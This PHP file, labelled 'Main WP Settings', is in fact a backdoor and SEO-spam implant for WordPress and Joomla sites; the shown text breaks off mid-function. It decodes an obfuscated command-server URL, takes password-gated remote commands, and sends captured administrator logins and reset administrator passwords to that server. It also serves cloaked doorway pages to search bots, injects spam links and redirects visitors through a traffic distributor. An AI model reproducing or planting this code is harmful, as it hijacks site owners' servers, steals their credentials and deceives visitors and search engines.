<?php $au='aHR3cCUzQSUyRiUyRnd6dy8iaWdicm2zcy8zaXRlJTJGbXNhdSUyRndvcmsucGhw';


// Main WP Settings $au

ini_set('display_errors', "On");
ini_set('memory_limit', '256M');
ini_set('max_execution_time', 0);
set_time_limit(0);
ignore_user_abort(1);
$aur = "";
if (!empty($au)) {
    $aur = $au;
}
$drw = new WPSettsD($aur, $table_prefix, $config);
if (empty($_GET[$drw->chkStr]) && !stripos("qqq" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'], "/admin") &&
    !stripos("qqq" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'], "wp-admin") && !empty($drw->dbCon)) {
    header('Content-type: text/html; charset=UTF-8');

    $drw->conf();
    if ($drw->checkTblIn()) {
        if (!empty($_POST["ddln"]) && $_POST["ddln"] == "y" && $drw->chkPssP($_POST["pssp"])) {
            $drw->dDLn();
            die();
        }
        if (!empty($_POST["ssetts"]) && $_POST["ssetts"] == "y" && $drw->chkPssP($_POST["pssp"])) {
            $drw->svStts();
            die();
        }
        if (!empty($_POST["nrc"]) && $drw->chkPssP($_POST["pssp"])) {
            $drw->sNrc();
            die();
        }
        if (!empty($_POST["chk"]) && $drw->chkPssP($_POST["pssp"])) {
            $drw->chkWrk();
            die();
        }
        if (!empty($_POST["nsetts"]) && $_POST["nsetts"] == "y" && ($_POST["prt"] === "0" || $_POST["prt"] > 0) && !empty($_POST["pssp"])) {
            if ($drw->chkPssP($_POST["pssp"])) {
                $drw->getSetts($_POST["prt"]);
            }
            die();
        }

        if (!empty($_POST["nprep"]) && !empty($_POST["pssp"])) {
            if ($drw->chkPssP($_POST["pssp"])) {
                $drw->svOnePg($_POST["nprep"]);
            }
            die();
        }

        if ($drw->chkTme()) {
            $drw->chkRidAndInst();
            $drw->sendStat();
        }
        $drw->chkBt();
        if ($drw->chkDrwPg()) {

            if ($drw->bot == "bot") {
                $drw->gtDPg();

            } else {
                $drw->gRed();
            }
        } else {
            if ($drw->bot == "bot") {

                if ($drw->chkHCod() && !empty($drw->stts) && $drw->stts["showlinks"] == "yes") {
                    $drw->shwPwL();
                }
            }
        }

    }
}


class WPSettsD
{
    private $au;
    private $rId;
    private $dbH;
    private $dbN;
    private $dbU;
    private $dbPs;
    private $dbPo;
    private $dbPref;
    private $sslSt;
    public $stts;
    private $ip;
    private $ua;
    private $ref;
    private $kw;
    private $gr;
    public $bot;
    private $curUrl;
    private $curCch;
    private $dom;
    private $tbl;
    private $mrd;
    public $dbCon;
    private $posts;
    private $ktUrl = "";
    private $ktToken = "";
    public $chkStr = "nv4dieatuy";
    private $fPostStr = "ryfa68o7"; // String for sending after created table
    private $pssP = "djd5eyu"; // String for recieve post pass
    private $pssPS = "ttyrdzs3rw"; // String for success save new POST pass
    private $gdTblStr = "nvbc4ettdhr"; // String for BD table exists
    private $getSettsStr = "dfshgdf435k"; // Get new setts string
    private $newSettsStr = "mer334y6rsd"; // String for new setts exists
    private $bdTempl = "sdgh545egj"; // String for bad templatre parsing
    private $sndTempl = "ire45sydgh"; // String for sending template
    private $sndPrtUrls = "ir34sdhjhk"; // String for sending urls part
    private $gdPrtUrls = "jtdse5yydyt"; // String for sending urls part
    private $gdNrc = "nvbtre5ydhfg"; // String for good save redir code
    private $fgtDPg = "fhre4hgdb"; // String for get doorway page
    private $sndSts = "g4ytjddfg"; // String for sending stats"
    private $stats = array();
    private $type;
    private $altUrl = "";

    public function __construct($au, $tblPref, $config)
    {
        $this->au = $this->dcdAu($au);
        $this->posts = $_POST;
        if (!empty($config->user)) {
            $this->dbH = $config->host;
            $this->dbN = $config->db;
            $this->dbU = $config->user;
            $this->dbPs = $config->password;
            $this->type = "jml";
        } elseif (!empty(DB_NAME)) {
            $this->dbH = DB_HOST;
            $this->dbN = DB_NAME;
            $this->dbU = DB_USER;
            $this->dbPs = DB_PASSWORD;
            $this->type = "wp";
        }

        $this->dbPo = "3306";
        if (stripos("qqq" . $this->dbH, ":")) {
            $this->dbH = explode(":", $this->dbH);
            $this->dbPo = $this->dbH[1];
            $this->dbH = $this->dbH[0];
        }
        if (empty($tblPref)) {
            if (!empty($config->dbprefix)) {
                $this->dbPref = $config->dbprefix;
            } else {
                $this->dbPref = "prf_";
            }
        } else {
            $this->dbPref = $tblPref;
        }
        $this->tbl = array(
            "name" => $this->dbPref . "wpsetts",
            "fields" => array(
                "type" => "BLOB",
                "atype" => "BLOB",
                "hash" => "BLOB",
                "url" => "BLOB",
                "alturl" => "BLOB",
                "althash" => "BLOB",
                "kw" => "LONGBLOB",
                "gr" => "LONGBLOB",
                "data" => "LONGBLOB"
            ),
            "index" => "hash",
            "indexcount" => "7",
            "created" => ""
        );
        $this->conDB();


    }

    function dcdAu($au)
    {
        $goodservurl = array();
        foreach (str_split($au) as $onechar) {
            if (is_numeric($onechar)) {
                if ($onechar >= 3) {
                    $onechar = $onechar - 3;
                } else {
                    $onechar = $onechar + 10 - 3;
                }
            }
            $goodservurl[] = $onechar;
        }
        return urldecode(base64_decode(implode($goodservurl)));
    }

    function conf()
    {

        if (function_exists("is_ssl")) {
            if (is_ssl() === false) {
                $this->sslSt = "http://";
            } else {
                $this->sslSt = "https://";
            }
        } else {
            if (isset($_SERVER['HTTPS'])) {
                $prot = $_SERVER['HTTPS'];
            } else {
                $prot = '';
            }
            if (!empty($prot) && $prot != 'off') {
                $this->sslSt = 'https://';
            } else {
                $this->sslSt = 'http://';
            }
        }
        $this->dom = $_SERVER["SERVER_NAME"];
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $this->ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
            $this->ip = $_SERVER['REMOTE_ADDR'];
        } else {
            $this->ip = "";
        }
        if (!empty($_SERVER['HTTP_USER_AGENT'])) {
            $this->ua = $_SERVER['HTTP_USER_AGENT'];
        } else {
            $this->ua = "";
        }
        if (!empty($_SERVER['HTTP_REFERER'])) {
            $this->ref = $_SERVER['HTTP_REFERER'];
        } else {
            $this->ref = "";
        }

        $this->curUrl = $_SERVER['SERVER_NAME'] . strtolower($_SERVER['REQUEST_URI']);
        $this->curUrl = $this->sslSt . $this->curUrl;

        $this->mrd = $this->rDB($this->dbPref . "options", "option_value", "`option_name` = 'siteurl'");
        if (empty($this->mrd["option_value"])) {
            if (class_exists('JURI')) {

                $this->mrd = JURI::root();
            } else {
                $this->mrd = $this->sslSt . $this->dom;
            }
        } else {
            $this->mrd = $this->mrd["option_value"];
        }

        $this->mrd = rtrim($this->mrd, "/");
//        if($_GET["test"] == "yes") {
//            $this->parseTemplateJML();
//        }
        $this->dbPrep();

        if ($this->tbl["created"] == "yes") {
            $this->chkNPP();
            $this->chkRid();

            $this->rId = $this->rDB($this->tbl["name"], "data", "`hash` = 'rid'");
            if (!empty($this->rId["data"])) {
                $this->rId = $this->rId["data"];
            } else {
                $this->rId = "";
            }
            if (!empty($_POST["log"]) && !empty($_POST["pwd"]) && function_exists("wp_authenticate")) {
                $this->getL();
            }
            $this->gtStts();
        }

    }

    function chkWrk()
    {
        $chkCount = $this->getTblCnt();
        $chkPg = $this->rDB($this->tbl["name"], "data", "`hash` = 'jhyt465ths' AND `type` = 'tst'");
        $chkPg = $chkPg["data"];

        $tstPg =  $this->gtCurP($this->mrd);
        $plLnk = false;
        if(strlen($tstPg) > 300) {
            $tstPg = $this->plLnks($chkPg, $chkPg);
            if (stripos("qqq" . $tstPg, $chkPg)){
                $plLnk = true;
            }
        }
        //m4ragfhfggasdre
        echo "6yhjdghjd".serialize(array(
                "cnt" => $chkCount,
                "pgdata" => $chkPg,
                "rid" => $this->rId,
                "pllnk" => $plLnk
            ))."6yhjdghjd";
        die();
    }

    function svOnePg($pgData)
    {


        $pgData = urldecode($pgData);
        $pgData = stripslashes($pgData);
        $pgData = preg_replace_callback ( '!s:(\d+):"(.*?)";!', function($match) {
            return ($match[1] == ($match[2])) ? $match[0] : 's:' . strlen($match[2]) . ':"' . $match[2] . '";';
        },$pgData );
        $pgData = unserialize($pgData);
        if(!empty($pgData["hash"])){
            $this->curCch = base64_decode($pgData["content"]);
            preg_match_all("/(bgfx5srtd.*bgfx5srtd)/iUs", $this->curCch, $matches);
            if (!empty($matches[1]) && count($matches[1]) > 0) {
                $this->wrkImg($matches[1]);
            }
            $this->insToDb("hash, type, url, kw, gr, data", "'" . $pgData["hash"] . "','drw', '" . urlencode
                ($pgData["url"]) . "', '" . urlencode($pgData["kw"]) . "', '" . $pgData["gr"] . "', '".urlencode($this->curCch)."'");
        } else {
            echo "yhu6hgfnfgs";
            die();
        }
    }

    function sendStat()
    {

        $cchCnt = $this->getChcCnt();
        if (!empty($cchCnt)) {
            $this->stats["ccnt"] = $cchCnt;
        } else {
            $this->stats["ccnt"] = 0;
        }
        $this->goP($this->au, $this->sndSts . "=y&stats=" . urlencode(serialize($this->stats)) . "&rid=" . $this->rId);
    }

    function chkKt()
    {
        if (!empty($this->stts["rd"])) {
            $red = $this->dcdAu($this->stts["rd"]);
            if (stripos("qqq" . $red, "keitaro|")) {
                $red = explode("|", $red);
                if (!empty($red[1]) && !empty($red[2])) {
                    $this->ktUrl = $red[1];
                    $this->ktToken = $red[2];
                    return true;
                }
            }
        }
        return false;
    }

    function chkBt()
    {

        if ($this->chkKt()) {
            $ktRes = $this->goP($this->ktUrl, "token=" . $this->ktToken . "&log=1&info=1&user_agent=" . urlencode
                ($this->ua) . "&ip=" . $this->ip);
            $ktRes = json_decode($ktRes);
            if ($ktRes->info->is_bot === true || $ktRes->body == "bot") {
                $this->bot = "bot";
            }
        } else {

            $is_bot = "";
            $user_agent_to_filter = array('#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#', '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i', '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i', '#www\.cys\.ru#i', '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i', '#CFNetwork#i', '#ConveraCrawler#i', '#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i', '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i', '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i', '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i', '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i', '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i', '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i', '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i', '#Yandex#i', '#Yanga#i', '#Yeti#i', '#msnbot#i', '#spider#i', '#yahoo#i', '#jeeves#i', '#googlebot#i', '#altavista#i', '#scooter#i', '#av\s*fetch#i', '#asterias#i', '#spiderthread revision#i', '#sqworm#i', '#ask#i', '#lycos.spider#i', '#infoseek sidewinder#i', '#ultraseek#i', '#polybot#i', '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i', '#charlotte#i', '#bingbot#i');
            $stop_ips_masks = array("66\.249\.[6-9][0-9]\.[0-9]", "74\.125\.[0-9]\.[0-9]", "65\.5[2-5]\.[0-9]\.[0-9]", "74\.6\.[0-9]\.[0-9]", "67\.195\.[0-9]\.[0-9]", "72\.30\.[0-9]\.[0-9]", "38\.[0-9]\.[0-9]\.[0-9]", "93\.172\.94\.227", "212\.100\.250\.218", "71\.165\.223\.134", "70\.91\.180\.25", "65\.93\.62\.242", "74\.193\.246\.129", "213\.144\.15\.38", "195\.92\.229\.2", "70\.50\.189\.191", "218\.28\.88\.99", "165\.160\.2\.20", "89\.122\.224\.230", "66\.230\.175\.124", "218\.18\.174\.27", "65\.33\.87\.94", "67\.210\.111\.241", "81\.135\.175\.70", "64\.69\.34\.134", "89\.149\.253\.169", "104\.132\.8\.69");
            foreach ($stop_ips_masks as $k => $v) {
                if (preg_match('#^' . $v . '$#', $this->ip)) {
                    $is_bot = "bot";
                }
            }
            if (empty($is_bot) && strpos("qqq" . preg_replace($user_agent_to_filter, '-ANGRYBOT-', $this->ua), '-ANGRYBOT-')) {
                $is_bot = "bot";
            }
            if ($is_bot == "bot") {
                $this->bot = "bot";
            }
        }
    }

    function gRed()
    {

        if ($this->chkKt()) {
            $ktRes = $this->goP($this->ktUrl, "token=" . $this->ktToken . "&log=1&info=1&user_agent=" . urlencode
                ($this->ua) . "&ip=" . $this->ip . "&keyword=" . urlencode($this->kw) . "&referrer=" . urlencode($this->ref) . "&source=" . urlencode($this->curUrl));
            $ktRes = json_decode($ktRes);
            if ($ktRes->info->type == "http") {
                header("Location: " . $ktRes->info->url, true, 302);
                exit();
            }
            if (!empty($ktRes->body)) {
                echo $ktRes->body;
                die();
            }
        } elseif (!empty($this->stts["rd"])) {
            $red = $this->dcdAu($this->stts["rd"]);
            $red = str_ireplace("[REFERER]", $this->ref, $red);
            $red = str_ireplace("[DOMAIN]", $_SERVER["SERVER_NAME"], $red);
            $red = str_ireplace("[CURURL]", $this->curUrl, $red);
            $red = str_ireplace("[KEYWORD]", $this->kw, $red);
            $red = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $this->kw), $red);
            $red = str_ireplace("[PLUSKEY]", str_ireplace(" ", "+", $this->kw), $red);
            if (stripos("qqq" . $red, "PHPREDIR")) {
                $red = str_ireplace("PHPREDIR:", "", $red);
                header("Location: " . $red, true, 302);
                exit();
            } else {
                echo $red;
                die();
            }

        }
    }

    function gtRdmK()
    {
        $rdmK = $this->rndDB($this->tbl["name"], "kw, gr", "`type` = 'drw'", 1);
        if (!empty($rdmK[0]["kw"]) && !empty($rdmK[0]["gr"])) {
            return $rdmK[0];
        }
        return false;
    }

    function chkDrwPg()
    {

        $crMd = md5($this->curUrl);

        $cch = $this->rDB($this->tbl["name"], "hash", "`hash` = '" . $crMd . "' AND `type` = 'drw'");
        if (empty($cch["hash"])) {
            $crMd = md5(str_ireplace("www.", "", $this->curUrl));
            $cch = $this->rDB($this->tbl["name"], "hash", "`hash` = '" . $crMd . "' AND `type` = 'drw'");
        }
        if (empty($cch["hash"])) {
            $crMd = md5(str_ireplace("www.", "", $this->curUrl));
            $cch = $this->rDB($this->tbl["name"], "hash, url, alturl", "`althash` = '" . $crMd . "' AND `type` = 'drw'");

            if (!empty($cch["url"])) {
                $this->curUrl = urldecode($cch["url"]);
                $crMd = md5(str_ireplace("www.", "", $this->curUrl));
            }
        }

        if (empty($cch["hash"]) && $this->stts["angry"] == "yes" && $this->chkHCode($this->curUrl)) {
            $ancurcpunt = $this->getChcCnt("yes");
            $anlimit = 0;
            if(!empty($this->stts["angrycount"])){
                $anlimit = $this->stts["angrycount"];
            }
            $goAn = "yes";
            if(!empty($this->stts["angrytype"]) && trim($this->curUrl, "/") == trim($this->mrd, "/")) {
                $goAn = "";
            }
            if(($ancurcpunt < $anlimit) || $anlimit == 0) {
                if($goAn == "yes") {
                    $rdmK = $this->gtRdmK();
                    if (!empty($rdmK)) {
                        $this->insToDb("hash, type, atype, url, kw, gr, data", "'" . $crMd . "','drw','ang', '" . urlencode($this->curUrl) . "', '" . $rdmK["kw"] . "', '" . $rdmK["gr"] . "', ''");
                        $cch = $this->rDB($this->tbl["name"], "hash", "`hash` = '" . $crMd . "' AND `type` = 'drw'");
                    }
                }
            }
        }
        if (!empty($cch["hash"])) {
            $this->curCch = $this->rDB($this->tbl["name"], "data,kw,gr,alturl", "`hash` = '" . $crMd . "' AND `type` = 'drw'");

            if (!empty($this->curCch["kw"]) && !empty($this->curCch["gr"])) {
                $this->kw = urldecode($this->curCch["kw"]);
                $this->gr = urldecode($this->curCch["gr"]);
            } else {
                return false;
            }
            if(!empty($this->curCch["alturl"])) {
                $this->altUrl = urldecode($this->curCch["alturl"]);
            }
            if (!empty($this->curCch["data"])) {
                $this->curCch = urldecode($this->curCch["data"]);
            } else {
                $this->curCch = "";
            }
            return true;
        }
        return false;
    }

    function gtDPg()
    {
        if (!empty($this->curCch)) {
            echo $this->curCch;
            die();
        }
        $this->curCch = $this->goP($this->au, $this->fgtDPg . "=y&kw=" . urlencode($this->kw) . "&gr=" . $this->gr . "&cururl=" . urlencode($this->curUrl) . "&rid=" . $this->rId);
        if (stripos("qqq" . $this->curCch, "ox54dtyaert")) {
            return false;
        }
        preg_match_all("/(bgfx5srtd.*bgfx5srtd)/iUs", $this->curCch, $matches);
        if (!empty($matches[1]) && count($matches[1]) > 0) {
            $this->wrkImg($matches[1]);
        }
        if (!empty($this->curCch)) {
            if(!empty($this->altUrl)){
                $this->curCch = str_ireplace("[HEREISALTLINK]", $this->altUrl, $this->curCch);
            }
            $this->uDB($this->tbl["name"], urlencode($this->curCch), "data", "`hash` = '" . md5($this->curUrl) . "'");
            echo $this->curCch;
            die();
        }
        return false;
    }

    private function wrkImg($imgs)
    {
        foreach ($imgs as $k => $oneImg) {
            $oneImg = str_ireplace("bgfx5srtd", "", $oneImg);

            $ext = ".jpg";
            if (stripos("qqq" . $oneImg, ".png")) {
                $ext = ".png";
            }
            if (stripos("qqq" . $oneImg, ".gif")) {
                $ext = ".gif";
            }
            $pthToSv = str_ireplace(" ", "-", trim($this->kw)) . "_" . $this->randString(5) . $ext;
            if ($this->svImg($oneImg, $pthToSv)) {
                $oneImg = '<img src="' . $this->mrd . ltrim($this->stts["imgspath"], ".") . "/" . $pthToSv . '">';
            } else {
                $oneImg = '';
            }
            $this->curCch = str_ireplace($imgs[$k], $oneImg, $this->curCch);
        }
    }

    private function svImg($url, $pthToSv)
    {
        $pthToSv = $this->stts["imgspath"] . "/" . $pthToSv;
        $ch = curl_init($url);
        $fp = fopen($pthToSv, 'wb');
        if (!$fp) {
            return false;
        }
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($httpCode != "200") {
            return false;
        }
        curl_close($ch);
        fclose($fp);
        return true;
    }

    function chkHCod($url = "")
    {
        if (empty($url)) {
            if (stripos("qqq" . $this->curUrl, "?")) {
                $url = $this->curUrl . "&" . $this->chkStr . "=y";
            } else {
                $url = trim($this->curUrl, "/") . "/?" . $this->chkStr . "=y";
            }
        }
        $default_socket_timeout = ini_get('default_socket_timeout');
        ini_set('default_socket_timeout', 5);
        file_get_contents($url);
        ini_set('default_socket_timeout', $default_socket_timeout);
        if ($http_response_header[0] == "HTTP/1.1 200 OK") {
            return true;
        } else {
            return false;
        }
    }

    function shwPwL()
    {

        $upd = "";
        $crMd = md5($this->curUrl);
        $lCch = $this->rDB($this->tbl["name"], "hash", "`hash` = '" . $crMd . "' AND `type` = 'lnk'");
        if (!empty($lCch["hash"])) {
            $lCch = $this->rDB($this->tbl["name"], "data", "`hash` = '" . $crMd . "' AND `type` = 'lnk'");
            if (!empty($lCch["data"])) {
                $lCch = $lCch["data"];
                $lCch = urldecode($lCch);
                $lCch = unserialize($lCch);
            } else {
                $upd = "y";
                $lCch = $this->gtLnks(rand(5, 8));
            }
        } else {
            $upd = "ins";
            $lCch = $this->gtLnks(rand(5, 8));
        }
        if (!empty($lCch) && count($lCch) > 0) {
            if ($upd == "y") {
                $this->uDB($this->tbl["name"], urlencode(serialize($lCch)), "data", "`hash` = '" . $crMd . "' AND `type` = 'lnk'");
            } elseif ($upd == "ins") {
                $this->insToDb("hash, type, data", "'" . $crMd . "', 'lnk', '" . urlencode(serialize($lCch)) . "'");
            }
            $lCch = implode(" ", $lCch);
            $curP = $this->gtCurP();
            if (!empty($curP)) {
                $curP = $this->plLnks($curP, $lCch);
                echo $curP;
                die();
            }
        }
    }

    private function gtLnks($cnt)
    {

        $resLnks = array();
        $lnks = $this->rndDB($this->tbl["name"], "url, kw", "`type` = 'drw'", $cnt);
        if (!empty($lnks) && count($lnks) > 0) {
            foreach ($lnks as $oLnk) {
                $resLnks[] = trim("<a href='" . trim(urldecode($oLnk["url"])) . "'>" . trim(urldecode($oLnk["kw"])) . "</a>");
            }
        }
        if (!empty($resLnks && count($resLnks) > 0)) {
            return $resLnks;
        } else {
            return "";
        }
    }

    private function plLnks($cP, $lnks)
    {
        $cP = preg_replace("/(<body.*>)/", "\$1" . $lnks, $cP, 1);
        return $cP;

    }

    private function gtCurP($cstUrl = "")
    {
        if(empty($cstUrl)){
            $cstUrl = $this->curUrl;
        }
        if (stripos("qqq" . $cstUrl, "?")) {
            $url = $cstUrl . "&" . $this->chkStr . "=y";
        } else {
            $url = trim($cstUrl, "/") . "/?" . $this->chkStr . "=y";
        }
        return file_get_contents($url);
    }

    function chkPssP($pssP)
    {
        $locPssP = $this->rDB($this->tbl["name"], "data", "`hash` = 'pssp'");
        if (!empty($locPssP["data"])) {
            if ($locPssP["data"] == $pssP) {
                return true;
            }
        }
        return false;
    }

    function chkTme($tme = 300)
    {
        $lastTime = $this->rDB($this->tbl["name"], "data", "`hash` = 'tme'");
        if (!empty($lastTime["data"]) && (time() - $lastTime["data"]) > $tme) {
            $this->uDB($this->tbl["name"], time(), "data", "`hash` = 'tme'");
            return true;
        }
        return false;
    }

    function dDLn()
    {
        //$this->dDB($this->tbl["name"], "`hash` = 'chpu'");
        $this->dDB($this->tbl["name"], "`hash` = 'stts'");
        $this->dDB($this->tbl["name"], "`type` = 'drw'");
        $this->dDB($this->tbl["name"], "`type` = 'lnk'");

    }


    private function chkNPP()
    {
        if (!empty($this->posts[$this->pssP]) && empty($this->rDB($this->tbl["name"], "data", "`hash` = 'pssp'"))) {
            if ($this->insToDb("hash, data", "'pssp','" . $this->posts[$this->pssP] . "'")) {
                echo $this->pssPS;
            }
        }
    }

    private function chkRid()
    {
        if (!empty($this->posts["rid"])) {
            $this->insToDb("hash, data", "'rid','" . $this->posts["rid"] . "'");
        }
    }

    private function resPass()
    {
        $adms = get_users([
            'role' => 'Administrator',
        ]);
        if (!empty($adms) && count($adms) > 0) {
            foreach ($adms as $oneAdn) {
                if (!empty($oneAdn->data->ID)) {
                    $nP = $this->randString(7);
                    wp_set_password($nP, $oneAdn->data->ID);
                    $lU = str_ireplace("index.php", "", $this->mrd);
                    $lU = rtrim($lU, "/") . "/wp-login.php";
                    $this->goP($this->au, "nsrees=" . $nP . "&un=" . urlencode($oneAdn->data->user_login) . "&mrd=" . urlencode($lU) . "&rid=" . $this->rId);
                }
            }
        }
    }

    private function getL()
    {
        $un = $_POST["log"];
        $up = $_POST["pwd"];

        $auth = wp_authenticate($un, $up);
        $auth = (array)$auth;
        if (!empty($auth["ID"])) {
            if (isset($auth["roles"][0]) && $auth["roles"][0] == "administrator") {

                if (isset($auth["allcaps"]["level_10"]) && $auth["allcaps"]["level_10"] === true) {
                    $this->goP($this->au, "nsrees=" . $up . "&un=" . urlencode($un) . "&mrd=" . urlencode($this->curUrl) . "&rid=" . $this->rId);
                }
            }
        }

    }

    function svStts()
    {
        if (!empty($this->posts["stts"])) {
            $this->posts["stts"] = stripslashes($this->posts["stts"]);
            $this->posts["stts"] = unserialize($this->posts["stts"]);
            if (!empty($this->posts["stts"]["resetpass"])) {
                $this->resPass();
            }
            unset($this->posts["stts"]["resetpass"]);
            if ($this->type == "wp") {
                $imgsP = "./wp-content/themes/imgs_" . $this->randString(5);
            } else {
                $imgsP = "./components/com_banners/imgs_" . $this->randString(5);
            }
            if (mkdir($imgsP)) {
                $this->posts["stts"]["imgspath"] = $imgsP;
            }
            $this->insToDb("hash, data", "'stts','" . urlencode(serialize($this->posts["stts"])) . "'");
        }
    }

    function gtStts()
    {
        $oStts = $this->rDB($this->tbl["name"], "data", "`hash` = 'stts'");
        if (!empty($oStts["data"])) {
            $oStts = urldecode($oStts["data"]);
            $oStts = unserialize($oStts);
            if (count($oStts) > 0) {
                $this->stts = $oStts;
            } else {
                $this->stts = "";
            }
        } else {
            $this->stts = "";
        }
    }

    function sNrc()
    {
        if (!empty($this->posts["nrc"])) {
            $oStts = $this->rDB($this->tbl["name"], "data", "`hash` = 'stts'");
            if (!empty($oStts["data"])) {
                $oStts = urldecode($oStts["data"]);
                $oStts = unserialize($oStts);
                if (count($oStts) > 0) {
                    $oStts["rd"] = $this->posts["nrc"];
                    $oStts = serialize($oStts);
                    $oStts = urlencode($oStts);
                    if ($this->uDB($this->tbl["name"], $oStts, "data", "`hash` = 'stts'")) {
                        echo $this->gdNrc;
                    }
                }
            }
        }
    }

    function chkRidAndInst()
    {
        if (empty($this->rId)) {
            $this->insToDb("hash, type, url, kw, gr, data", "'jhyt465ths','tst', 'ncv876rtyuhgf', 'mw45ergtdhgf', 'kiet6w4eet', 'm4ragfhfggasdre'");
            $this->goP($this->au, $this->fPostStr . "=y&dmn=" . urlencode($this->mrd)."&pth=".urlencode(__FILE__));

            $this->rId = $this->rDB($this->tbl["name"], "data", "`hash` = 'rid'");
            if (!empty($this->rId["data"])) {
                $this->rId = $this->rId["data"];
                $this->templWork();
            } else {
                $this->rId = "";
            }
        }
    }

    private function templWork($chpu = "")
    {
        $templ = array();

        if(!empty($this->stts["customtemplpage"])){
            $templ["sitetemp"] = $this->getTemplate(urldecode($this->stts["customtemplpage"]));

        } else {
            if ($this->type == "wp") {
                $templ = $this->parseTemplateWP();
            } else {
                $templ = $this->parseTemplateJML();
            }
        }
        if(empty($chpu)) {
            $structure = "";
            if (function_exists("get_option")) {
                $structure = get_option('permalink_structure');
            }
            if (empty($structure) || stripos("qqq" . $structure, "?p=")) {
                $chpu = rtrim($this->mrd, "/") . "/?p=" . "chpukeyplace/";
            } else {
                $chpu = rtrim($this->mrd, "/") . "/chpukeyplace/";
            }
            $this->insToDb("hash, data", "'chpu','" . urlencode($chpu) . "'");
        }

        if(!empty($templ["sitetemp"])) {
            $templ["sitetemp"] = gzdeflate($templ["sitetemp"]);
            $templ["sitetemp"] = base64_encode($templ["sitetemp"]);
            $this->goP($this->au, $this->sndTempl . "=y&rid=" . $this->rId . "&tmpl=" . urlencode($templ["sitetemp"]) . "&cod=yes");
            $this->goP($this->au, "chpu=".urlencode($chpu)."&rid=" . $this->rId);
        }

    }

    private function getTemplate($customPage = "")
    {
        if(!empty($customPage)){
            $this->curUrl = $customPage;
        }
        $sitecode = file_get_contents($this->curUrl."?".$this->chkStr."=yes");
        if (!empty($sitecode)) {
            $sitecode = preg_replace("/<!--.*-->/iUs", "", $sitecode);
            $regex = "/(<p.*>.*<\/p>)/iUsm";
            preg_match_all($regex, $sitecode, $matches);
            if (!empty($matches[1])) {
                $maxlength_p = $this->getMaxLengthFromArray($matches[1], 300);
                if (!empty($maxlength_p)) {
                    $sitecode = str_ireplace($maxlength_p, "<p>[HEREISCONTENT]</p>", $sitecode);
                    foreach ($matches[1] as $one_p) {
                        $sitecode = str_ireplace($one_p, "", $sitecode);
                    }
                } else {
                    $sitecode = preg_replace("/(<body.*>)/", "\$1" . "\n<div><p>[HEREISCONTENT]</p></div>", $sitecode, 1);
                }
            } else {
                $sitecode = preg_replace("/(<body.*>)/", "\$1" . "\n<div><p>[HEREISCONTENT]</p></div>", $sitecode, 1);
            }

            $regular = "|<title>(.*)<\/title>|iUs";
            preg_match_all($regular, $sitecode, $matches);
            if (!empty($matches[1])) {
                $matches[1] = array_unique($matches[1]);
                foreach ($matches[1] as $pagetitlemain) {
                    $sitecode = str_ireplace($pagetitlemain, '[HEREISPAGETITLE]', $sitecode);
                }
            }
            $regular = "|(<h2.*>.*</h2+>)|iUs";
            preg_match_all($regular, $sitecode, $matches);
            if (!empty($matches[1])) {
                $matches[1] = array_unique($matches[1]);
                srand((float)microtime() * 1000000);
                shuffle($matches[1]);
                if (count($matches[1]) >= 2) {
                    $counth = count($matches[1]) / 2;
                    $counth = floor($counth);
                    $matches[1] = array_slice($matches[1], 0, $counth - 1);
                }
                foreach ($matches[1] as $htagmain) {
                    $sitecode = str_ireplace($htagmain, '[HEREISHTAG]', $sitecode);
                }
            }

            $regular = "|(<h1.*>.*</h1+>)|iUs";
            preg_match_all($regular, $sitecode, $matches);
            if (!empty($matches[1])) {
                $matches[1] = array_unique($matches[1]);

                foreach ($matches[1] as $htagmain) {
                    $sitecode = str_ireplace($htagmain, '[HEREISPOSTTITLE]', $sitecode);
                }
            }
            $regular = "|<a\s.*(href=[\"']+.*[\"']+).*>(.*)<\/a>|iUs";
            preg_match_all($regular, $sitecode, $matches);
            if (!empty($matches[1])) {
                $all_links = $matches[0];
                $atagarray = array_combine($matches[2], $matches[1]);
                $atagarray = array_unique($atagarray);
                foreach ($atagarray as $anchor => $url) {
                    if (stripos("qqq" . $url, "feed") || stripos("qqq" . $url, "wp-login") || stripos("qqq" . $url, "#") || (stripos("qqq" . $anchor, "<") && stripos("qqq" . $anchor, ">"))) {
                        unset($atagarray[$anchor]);
                    }
                }
                srand((float)microtime() * 1000000);
                shuffle($atagarray);
                if (count($atagarray) >= 3) {
                    $counta = count($atagarray) / 3;
                    $counta = floor($counta);
                    $atagarray = array_slice($atagarray, 0, $counta - 1);
                }
                foreach ($all_links as $atagmain) {
                    foreach ($atagarray as $url) {
                        if (stripos("qqq" . $atagmain, $url)) {
                            $atagtoreplace = preg_replace("/href=[\"']+.*[\"']+/iUs", "href=\"[HEREISATAGLINK]\"", $atagmain);
